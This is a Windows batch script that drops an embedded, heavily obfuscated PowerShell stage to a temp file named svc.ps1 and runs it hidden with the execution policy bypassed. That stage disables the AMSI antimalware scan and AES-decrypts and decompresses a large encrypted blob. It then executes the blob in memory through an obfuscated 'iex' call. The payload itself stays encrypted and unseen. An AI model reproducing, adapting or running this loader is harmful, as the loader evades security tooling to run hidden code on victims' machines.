@echo off
setlocal
set "PS=%TEMP%\svc.ps1"
del "%PS%" 2>nul

powershell -NoP -W Hidden -ExecutionPolicy Bypass -Command "$L=[IO.File]::ReadAllLines('%~f0');$A=[array]::IndexOf($L,'#PS1#')+1;$B=[array]::IndexOf($L,'#END#');[IO.File]::WriteAllLines($env:PS,$L[$A..($B-1)])"

if not exist "%PS%" exit /b

powershell -NoP -W Hidden -ExecutionPolicy Bypass -File "%PS%"
del "%PS%" 2>nul
endlocal
exit /b
#PS1#
$fZpNpViRjhmHibZx = ('Assemb' + 'ly')
$yO4Ohp5VsTl2Ml = ('GetTy' + 'pe')
$UpsCfiRqSGArPmsf6T = ('GetFie' + 'ld')
$FPzs1Haln8SjKeT = ('SetVal' + 'ue')
$wXS4tsAlEc2EGpQN = [sTriNg]::('new')([cONVERT]::('FromBa' + 'se64S' + 'tring')('U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdA=='))
$DfgsABxB7H6AS6I1k = [sTriNg]::('new')([cONVERT]::('FromBa' + 'se64S' + 'tring')('aW9uLkFtc2lVdGlscw=='))
$WgjTgVXQUkoqMGRzIy = [sTriNg]::('new')([cONVERT]::('FromBa' + 'se64S' + 'tring')('YW1zaUluaXRGYWlsZWQ='))
$cni6VYlUErbYn1s7R = [sTriNg]::('new')([cONVERT]::('FromBa' + 'se64S' + 'tring')('Tm9uUHVibGljLFN0YXRpYw=='))
$NwPU6fIsMfynoamTU = [reF].$fZpNpViRjhmHibZx
$bnfANoJafCvp4iS = $NwPU6fIsMfynoamTU.$yO4Ohp5VsTl2Ml.('InVoK' + [cHAR](101))(($wXS4tsAlEc2EGpQN+$DfgsABxB7H6AS6I1k))
$eBeo5KC2vIBtvDU = $bnfANoJafCvp4iS.$UpsCfiRqSGArPmsf6T.('InVoK' + [cHAR](101))($WgjTgVXQUkoqMGRzIy,$cni6VYlUErbYn1s7R)
$eBeo5KC2vIBtvDU.$FPzs1Haln8SjKeT.('InVoK' + [cHAR](101))((100-100),(200 -eq 200))
$macJck4BYp1aZebhK = ('Mode')
$XLuMJUQgDHa8rkPGZ = ('Block' + 'Size')
$p3c16g5dKSHQlM = ('KeyS' + 'ize')
$a5n7gYOLWBVLtw8m = ('Key')
$nComIqV7VtWSaneKr = ('Iv')
$dddix7bEqXTSII6hn = ('Creat' + 'eDecry' + 'ptor')
$cQ0aNS1HnAXQcY = ('Transf' + 'ormFin' + 'alBloc' + [cHaR](107))
$NBxB4JeiLWGVc1nvU5 = ('Lengt' + [Char](104))
$UKZmkztc41mCcw = ('CopyT' + [ChAR](111))
$KvCa0t9bals39O0J = ('Close')
$J8PBPle9ZBoYYv = ('Dispo' + 'se')
$YWGyd1NetAnI8NKRNN = ('ToArr' + 'ay')
$onZ3vlc9EDnOu8 = ('GetSt' + 'ring')
$wHIgAnZqFc6IBfo = [COnVErT]::('FromBa' + 'se64St' + 'ring')('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')
$ExUOXycyedFz2oP = [COnVErT]::('FromBa' + 'se64St' + 'ring')('8n+xz27ZNuglidb5osgg26AcYGIk2hba0OWvClWhc0s=')
$Quz29IC5qhfMM4Y = [seCURity.cRYPtOGraPHY.aeS]::('Create')()
$Quz29IC5qhfMM4Y.$macJck4BYp1aZebhK = [sECURItY.crypToGRAPHY.CIPhErmodE]::('Cbc')
$Quz29IC5qhfMM4Y.$XLuMJUQgDHa8rkPGZ = [InT]((7795 -band 4027)+(7795 -bor 4027)-11694)
$Quz29IC5qhfMM4Y.$p3c16g5dKSHQlM = [InT]((1359 -band 9221)+(1359 -bor 9221)-10324)
$Quz29IC5qhfMM4Y.$a5n7gYOLWBVLtw8m = $ExUOXycyedFz2oP
$Quz29IC5qhfMM4Y.$nComIqV7VtWSaneKr = $wHIgAnZqFc6IBfo[0..15]
$ZSA9N6CI2Q6C8zsR = $Quz29IC5qhfMM4Y.$dddix7bEqXTSII6hn.('INvoK' + [CHAR](69))()
$I4IwNIWQvLX8MmJG = $ZSA9N6CI2Q6C8zsR.$cQ0aNS1HnAXQcY.('INvoK' + [CHAR](69))($wHIgAnZqFc6IBfo,16,($wHIgAnZqFc6IBfo.$NBxB4JeiLWGVc1nvU5 - 16))
$StYgEKlf5T8sgomoT = [IO.MEMoRysTReAM]::('new')([byte[]]$I4IwNIWQvLX8MmJG)
$OAnmixtUjH8lzB = [IO.MEMoRysTReAM]::('new')()
$fqPcvOPf3Xtjpt = [Io.ComPresSION.gzIpStREam]::('new')($StYgEKlf5T8sgomoT, [IO.ComPRESsIoN.COmprESSioNMoDe]::('Decom' + 'pres' + [CHAR](115)))
$fqPcvOPf3Xtjpt.$UKZmkztc41mCcw.('INvoK' + [CHAR](69))($OAnmixtUjH8lzB)
$fqPcvOPf3Xtjpt.$KvCa0t9bals39O0J.('INvoK' + [CHAR](69))()
$Quz29IC5qhfMM4Y.$J8PBPle9ZBoYYv.('INvoK' + [CHAR](69))()
$StYgEKlf5T8sgomoT.$KvCa0t9bals39O0J.('INvoK' + [CHAR](69))()
$o3EXr9yk3WD7MoiL = $OAnmixtUjH8lzB.$YWGyd1NetAnI8NKRNN.('INvoK' + [CHAR](69))()
$kjplkzwGBCcPjxZD7 = [teXt.eNCoding]::('Utf8')
$OiYzhVbc46Xwlr = $kjplkzwGBCcPjxZD7.$onZ3vlc9EDnOu8.('INvoK' + [CHAR](69))($o3EXr9yk3WD7MoiL)
.([char]((5264-band3653)+(5264-bor3653)-8812)+[char]((9345-band8803)+(9345-bor8803)-18047)+[char]((4024-band4872)+(4024-bor4872)-8776))($OiYzhVbc46Xwlr)
#END#